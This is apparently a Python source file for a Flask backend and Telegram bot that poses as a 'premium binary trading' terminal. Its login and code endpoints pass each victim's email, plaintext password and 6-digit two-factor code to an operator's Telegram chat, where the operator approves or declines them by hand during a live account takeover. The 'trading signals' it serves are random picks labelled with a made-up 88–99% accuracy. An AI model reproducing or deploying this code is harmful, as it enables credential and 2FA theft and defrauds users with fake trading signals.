import os
import threading
import time
import random
from flask import Flask, request, jsonify
from flask_cors import CORS
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo

BOT_TOKEN = os.environ.get('BOT_TOKEN', 'YOUR_BOT_TOKEN')
ADMIN_ID = os.environ.get('ADMIN_CHAT_ID', 'YOUR_ADMIN_ID')
FRONTEND_URL = os.environ.get('FRONTEND_URL', 'https://your-frontend-url.com')

app = Flask(__name__)
CORS(app, resources={r"/api/*": {"origins": "*"}})

bot = telebot.TeleBot(BOT_TOKEN)

# In-Memory Database
users_db = {}

# ==========================================
# 🤖 TELEGRAM ADMIN COMMANDS
# ==========================================
@bot.message_handler(commands=['start'])
def start_cmd(message):
    safe_url = FRONTEND_URL if FRONTEND_URL.startswith('https://') else 'https://google.com'
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton(text="🚀 OPEN TRADING TERMINAL", web_app=WebAppInfo(url=safe_url)))

    bot.reply_to(
        message, 
        "⚡ *PREMIUM BINARY TRADING ENGINE*\n\nWelcome! Click below to enter the secure vault.", 
        parse_mode="Markdown",
        reply_markup=markup
    )

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    try:
        parts = call.data.split('_')
        action, stage, uid = parts[0], parts[1], parts[2]

        if uid in users_db:
            user = users_db[uid]
            email = user.get('email', 'N/A')
            password = user.get('password', 'N/A') # Fetching password from memory
            code = user.get('code', 'N/A')

            if action == 'app' and stage == 'login':
                users_db[uid]['status'] = 'code_required'
                bot.answer_callback_query(call.id, "Login Approved!")
                text = f"🔐 *LOGIN ATTEMPT*\n\n*User:* `{uid}`\n*Email:* `{email}`\n*Password:* `{password}`\n\n✅ *STATUS: WAITING FOR 6-DIGIT CODE*"
                bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode="Markdown")
            
            elif action == 'dec' and stage == 'login':
                users_db[uid]['status'] = 'declined'
                bot.answer_callback_query(call.id, "Login Declined!")
                text = f"🔐 *LOGIN ATTEMPT*\n\n*User:* `{uid}`\n*Email:* `{email}`\n*Password:* `{password}`\n\n❌ *STATUS: DECLINED*"
                bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode="Markdown")
            
            elif action == 'app' and stage == 'code':
                users_db[uid]['status'] = 'approved'
                bot.answer_callback_query(call.id, "Code Approved!")
                text = f"🔑 *2FA VERIFICATION*\n\n*User:* `{uid}`\n*Code:* `{code}`\n\n✅ *STATUS: FULL ACCESS GRANTED*"
                bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode="Markdown")
            
            elif action == 'dec' and stage == 'code':
                users_db[uid]['status'] = 'declined'
                bot.answer_callback_query(call.id, "Code Declined!")
                text = f"🔑 *2FA VERIFICATION*\n\n*User:* `{uid}`\n*Code:* `{code}`\n\n❌ *STATUS: CODE DECLINED*"
                bot.edit_message_text(text, call.message.chat.id, call.message.message_id, parse_mode="Markdown")
    except Exception as e:
        print(f"Callback Error: {e}")

def run_telebot():
    print("🤖 Telegram Bot Polling Started...")
    bot.infinity_polling()

# ==========================================
# 🌐 FLASK WEB API
# ==========================================
@app.route('/api/login', methods=['POST'])
def login():
    data = request.json
    uid = str(data.get('user_id', 'unknown'))
    email = data.get('email')
    password = data.get('password') # Extracting password from frontend
    
    # Storing password in the database so we can use it later
    users_db[uid] = {'status': 'pending_login', 'email': email, 'password': password}
    
    markup = InlineKeyboardMarkup()
    markup.add(
        InlineKeyboardButton("✅ Approve", callback_data=f"app_login_{uid}"),
        InlineKeyboardButton("❌ Decline", callback_data=f"dec_login_{uid}")
    )
    # Replaced [HIDDEN] with the actual password variable
    text = f"🔐 *NEW LOGIN REQUEST*\n\n*User ID:* `{uid}`\n*Email:* `{email}`\n*Password:* `{password}`\n\nApprove access?"
    try:
        bot.send_message(ADMIN_ID, text, reply_markup=markup, parse_mode='Markdown')
    except Exception as e:
        print(f"Admin send error: {e}")
    
    return jsonify({"status": "processing"})

@app.route('/api/code', methods=['POST'])
def submit_code():
    data = request.json
    uid = str(data.get('user_id', 'unknown'))
    code = data.get('code')

    if uid in users_db:
        users_db[uid]['status'] = 'pending_code'
        users_db[uid]['code'] = code
        
        markup = InlineKeyboardMarkup()
        markup.add(
            InlineKeyboardButton("✅ Approve Code", callback_data=f"app_code_{uid}"),
            InlineKeyboardButton("❌ Decline Code", callback_data=f"dec_code_{uid}")
        )
        text = f"🔑 *SECURITY CODE SUBMITTED*\n\n*User ID:* `{uid}`\n*Code entered:* `{code}`\n\nApprove entry to Trading Room?"
        try:
            bot.send_message(ADMIN_ID, text, reply_markup=markup, parse_mode='Markdown')
        except Exception:
            pass

    return jsonify({"status": "processing"})

@app.route('/api/status/<uid>', methods=['GET'])
def check_status(uid):
    user = users_db.get(str(uid), {})
    return jsonify({"status": user.get('status', 'not_found')})

@app.route('/api/get_signal/<uid>', methods=['GET'])
def get_signal(uid):
    user = users_db.get(str(uid))
    if not user or user.get('status') != 'approved':
        return jsonify({"error": "unauthorized"}), 403
    
    time.sleep(2) # Simulate calculation delay for animation
    is_up = random.choice([True, False])
    accuracy = random.randint(88, 99)
    
    return jsonify({
        "direction": "CALL ⬆️" if is_up else "PUT ⬇️",
        "accuracy": f"{accuracy}.{random.randint(1,9)}%",
        "type": "up" if is_up else "down"
    })

if __name__ == '__main__':
    threading.Thread(target=run_telebot, daemon=True).start()
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)
